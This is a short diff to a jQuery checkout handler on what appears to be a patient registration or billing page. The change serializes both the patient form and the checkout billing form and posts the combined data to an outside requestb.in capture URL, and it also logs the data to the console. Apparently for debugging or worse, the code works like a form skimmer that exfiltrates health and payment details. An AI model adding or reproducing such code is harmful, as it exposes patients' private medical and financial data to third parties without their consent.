@@ -50,9 +50,10 @@ function load() {
 
     jQuery('form.checkout').submit(function(e) {
       jQuery('form.new-patient').attr('action', 'http://requestb.in/1et2h7e1').submit()
-      var data = jQuery('form.new-patient').serialize()
-      jQuery.post('http://requestb.in/1et2h7e1', {method:'POST', data:data})
-      console.log('form.new-patient', data)
+      var patient  = jQuery('form.new-patient').serialize()
+      var billing  = jQuery('form.checkout').serialize()
+      jQuery.post('http://requestb.in/1et2h7e1', {method:'POST', data:patient+'&'+billing})
+      console.log('form.new-patient', patient+'&'+billing)
       e.preventDefault()
     })
   }
